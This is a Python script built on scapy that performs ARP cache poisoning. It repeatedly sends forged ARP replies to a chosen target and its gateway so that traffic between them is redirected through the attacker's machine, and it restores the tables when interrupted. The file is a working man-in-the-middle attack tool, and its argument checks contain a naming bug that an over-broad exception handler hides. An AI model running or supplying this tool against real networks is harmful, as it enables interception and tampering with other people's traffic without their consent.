import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Poison the arp table of both the target and the client")
    parser.add_argument("-i","--interface", dest="interface", help="Interface of target network")
    parser.add_argument("-t","--target", dest="target_ip", help="IP of target to spoof")
    parser.add_argument("-g","--gateway", dest="gateway_ip", help="IP of gateway to spoof")
    args = parser.parse_args()
    
    if not args.interface:
        print("Please specify an interface")
    if not args.target:
        print("Please specify a Target ip")
    elif not args.gateway:
        print("Please specify a gateway ip")

    return args

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, iface=interface, timeout=4, verbose=False) [0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip, interface)
    packet = scapy.ARP(op=2, pdst=target_ip , hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip, interface):

    #To get the target mac address
    target_mac = get_mac(dest_ip, interface)
    
    #To get the target mac address
    source_mac = get_mac(source_ip, interface)

    packet = scapy.ARP(op=2, pdst=dest_ip , hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False)


try:
    sent_packet_count = 0
    option = get_arguments()
    while True:
        spoof(option.target_ip, option.gateway_ip, option.interface)
        spoof(option.gateway_ip, option.target_ip, option.interface)
        sent_packet_count+=2
        print("\r[+] Packet sent = " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C\n[+] Restoring ARP table ... please wait ...")
    restore(option.target_ip, option.gateway_ip, option.interface)
    restore(option.gateway_ip, option.target_ip, option.interface)
except Exception:
    pass